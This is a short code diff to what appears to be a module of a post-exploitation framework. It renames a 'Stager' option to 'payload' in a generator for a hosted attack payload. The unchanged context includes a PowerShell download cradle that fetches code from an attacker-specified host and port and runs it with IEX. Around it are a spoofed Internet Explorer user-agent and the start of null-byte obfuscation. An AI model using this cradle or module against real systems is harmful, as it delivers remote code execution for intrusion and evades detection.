@@ -50,13 +50,13 @@ class Module:
                 'Required'   :   True,
                 'Value'      :   ''
             },
-            'Stager': {
-                'Description':   'Stager file that you have hosted.',
+            'payload': {
+                'Description':   'payload file that you have hosted.',
                 'Required'   :   True,
                 'Value'      :   'update.php'
             },
             'Host': {
-                'Description':   'Host or IP where stager is served.',
+                'Description':   'Host or IP where payload is served.',
                 'Required'   :   True,
                 'Value'      :   ''
             },
@@ -66,7 +66,7 @@ class Module:
                 'Value'      :   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
             },
             'Port': {
-                'Description':   'Port to connect to where stager is served',
+                'Description':   'Port to connect to where payload is served',
                 'Required'   :   True,
                 'Value'      :   ''
             },
@@ -101,7 +101,7 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
-        stager = self.options['Stager']['Value']
+        payload = self.options['payload']['Value']
         host = self.options['Host']['Value']
         userAgent = self.options['UserAgent']['Value']
         port = self.options['Port']['Value']
@@ -141,7 +141,7 @@ class Module:
             blank_command = ""
             powershell_command = ""
             encodedCradle = ""
-            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host,port,stager)
+            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host,port,payload)
             # Remove weird chars that could have been added by ISE
             n = re.compile(u'(\xef|\xbb|\xbf)')
             # loop through each character and insert null byte
